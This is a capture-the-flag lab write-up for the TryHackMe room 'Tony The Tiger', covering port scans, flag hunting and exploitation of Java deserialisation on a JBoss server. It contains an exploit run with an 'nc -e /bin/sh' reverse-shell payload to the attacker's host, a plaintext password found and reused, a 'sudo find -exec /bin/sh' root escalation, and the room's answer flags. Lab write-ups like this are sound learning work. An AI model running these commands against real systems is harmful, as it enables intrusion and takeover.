# THM - Tony The Tiger

Guided room about Java Serialisation

## Date Commenced 20MAR2022


---
## IP Address
### Attempt 1
export IP=10.10.82.48


---
## Open Ports

> 22,80,8080


Perform Basic **nmap** scan:

> nmap -vvv 10.10.82.48 -p- -oN ./Results/nmap01.log

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-20 04:28 EDT
Initiating Ping Scan at 04:28
Scanning 10.10.82.48 [2 ports]
Completed Ping Scan at 04:28, 0.23s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 04:28
Completed Parallel DNS resolution of 1 host. at 04:28, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 04:28
Scanning 10.10.82.48 [65535 ports]
Discovered open port 80/tcp on 10.10.82.48
Discovered open port 8080/tcp on 10.10.82.48
Discovered open port 22/tcp on 10.10.82.48
Increasing send delay for 10.10.82.48 from 0 to 5 due to max_successful_tryno increase to 4
Increasing send delay for 10.10.82.48 from 5 to 10 due to 11 out of 34 dropped probes since last increase.
Increasing send delay for 10.10.82.48 from 10 to 20 due to max_successful_tryno increase to 5
Connect Scan Timing: About 1.88% done; ETC: 04:55 (0:26:59 remaining)
Increasing send delay for 10.10.82.48 from 20 to 40 due to max_successful_tryno increase to 6
Increasing send delay for 10.10.82.48 from 40 to 80 due to max_successful_tryno increase to 7
Connect Scan Timing: About 2.72% done; ETC: 05:05 (0:36:18 remaining)
Connect Scan Timing: About 3.25% done; ETC: 05:14 (0:45:08 remaining)
Connect Scan Timing: About 3.80% done; ETC: 05:21 (0:51:06 remaining)

```

Perform more intensive scan:

> nmap $IP -p 22,80,8080,6500,6501 -sC -sV -A -oN ./Results/nmap02.log

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-20 04:31 EDT
Nmap scan report for 10.10.82.48
Host is up (0.24s latency).

PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d6:97:8c:b9:74:d0:f3:9e:fe:f3:a5:ea:f8:a9:b5:7a (DSA)
|   2048 33:a4:7b:91:38:58:50:30:89:2d:e4:57:bb:07:bb:2f (RSA)
|   256 21:01:8b:37:f5:1e:2b:c5:57:f1:b0:42:b7:32:ab:ea (ECDSA)
|_  256 f6:36:07:3c:3b:3d:71:30:c4:cd:2a:13:00:b5:25:ae (ED25519)
80/tcp   open   http       Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: Hugo 0.66.0
|_http-title: Tony&#39;s Blog
|_http-server-header: Apache/2.4.7 (Ubuntu)
6500/tcp closed boks
6501/tcp closed boks_servc
8080/tcp open   http       Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Welcome to JBoss AS
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE
|_http-server-header: Apache-Coyote/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.65 seconds
```

> What service is running on port "8080"?
>
> Apache Tomcat/Coyote JSP engine 1.1

> What is the name of the front-end application running on "8080"?
>
> JBoss


---
## Web Page
Reading the web pages and viewing the source didn't reveal much except that *Tony* states that any images on his site must have a *deeper meaning*. So downloaded both images i could find and ran *exiftool*, *binwalk*, and *strings* to reveal any secrets:

```
strings be2sOV9.jpg | grep THM
}THM{Tony_Sure_Loves_Frosted_Flakes}
'THM{Tony_Sure_Loves_Frosted_Flakes}(dQ
```

Got my first flag:

> THM{Tony_Sure_Loves_Frosted_Flakes}


---
## Reverse Shell
As this is a guided room, there is an exploit provided to research and experiment with to get a reverse shell:

```
┌──(kali㉿kali)-[~/THM/TonyTheTiger/Exploit/jboss]
└─$ sudo python2 exploit.py 10.10.82.48:8080 "nc -e /bin/sh 10.9.0.151 4444"
[*] Target IP: 10.10.82.48
[*] Target PORT: 8080
[+] Command executed successfully
```

And got me a reverse shell as the user *cmnatic*!

And upgraded the shell.


---
## Linux Enum
Poke the penguin!

### sudo
No password for this user, so no sudo.

### SUID
Nothing really interesting here yet.

```
cmnatic@thm-java-deserial:/$ find / -perm -4000 2> /dev/null
/bin/mount
/bin/ping6
/bin/su
/bin/ping
/bin/fusermount
/bin/umount
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/at
/usr/bin/mtr
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chfn
/usr/sbin/pppd
/usr/sbin/uuidd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

### /etc/passwd
Find usernames:

> cat /etc/passwd | grep home

```
syslog:x:101:104::/home/syslog:/bin/false
cmnatic:x:1000:1000:cmnatic,,,:/home/cmnatic:/bin/bash
jboss:x:1001:1001:,,,:/home/jboss:/bin/bash
tony:x:1002:1002:,,,:/home/tony:/bin/bash
```

### Cruising around the Filesystem
Found a *note* file in *JBoss* home directory:

```
Hey JBoss!

Following your email, I have tried to replicate the issues you were having with the system.

However, I don't know what commands you executed - is there any file where this history is stored that I can access?

Oh! I almost forgot... I have reset your password as requested (make sure not to tell it to anyone!)

Password: likeaboss

Kind Regards,
CMNatic
```

So escalate to *jboss* user and continue to enumerate.

### sudo as jboss
Can run a command as *sudo* from *jboss* user account:

```
Matching Defaults entries for jboss on thm-java-deserial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jboss may run the following commands on thm-java-deserial:
    (ALL) NOPASSWD: /usr/bin/find
```


---
## user.txt
Performed a recursive **grep** search for *THM*:

> grep THM -R / 2> /dev/null

```
Binary file /home/cmnatic/jboss/common/lib/xmlsec.jar matches
Binary file /home/cmnatic/jboss/common/lib/xalan.jar matches
Binary file /home/cmnatic/jboss/server/default/deployers/resteasy.deployer/apache-mime4j-0.6.jar matches
Binary file /home/cmnatic/jboss/server/default/tmp/vfs/automount2059928bf008f36b/apache-mime4j-0.6.jar-e973449d5e442083/apache-mime4j-0.6.jar matches
Binary file /home/cmnatic/jboss/server/all/deployers/resteasy.deployer/apache-mime4j-0.6.jar matches
Binary file /home/cmnatic/jboss/server/standard/deployers/resteasy.deployer/apache-mime4j-0.6.jar matches
Binary file /home/cmnatic/jboss/client/xmlsec.jar matches
Binary file /home/cmnatic/jboss/client/xalan.jar matches
/home/jboss/.jboss.txt:THM{50c10ad46b5793704601ecdad865eb06}
/home/jboss/.bash_history:echo "THM{50c10ad46b5793704601ecdad865eb06}" > jboss.txt
Binary file /boot/initrd.img-4.4.0-142-generic matches
/boot/config-4.4.0-142-generic:CONFIG_RWSEM_XCHGADD_ALGORITHM=y
/boot/config-4.4.0-142-generic:CONFIG_SENSORS_THMC50=m
```

Found the flag:

> FLAG: THM{50c10ad46b5793704601ecdad865eb06}


---
## root.txt
Escalated to *root* and found the *root.txt* flag:

```
jboss@thm-java-deserial:~$ sudo find . -exec /bin/sh \; -quit
# whoami
root
# cat /root/root./^Htxt
cat: /root/root.txt: No such file or directory
# ^[: not foundH^H^H^H
# cat /root/root.txt
QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==
```

> QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==

This too needed to be cracked: 

```
┌──(kali㉿kali)-[~/THM/TonyTheTiger/Hash]
└─$ echo "QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==" | base64 --decode
BC77AC072EE30E3760806864E234C7CFbase64: invalid input
```

And then run *BC77AC072EE30E3760806864E234C7CF* through *crackstation.net*:

![CrackStation](Images/09-crackstaion.png)

> FLAG zxcvbnm123456789






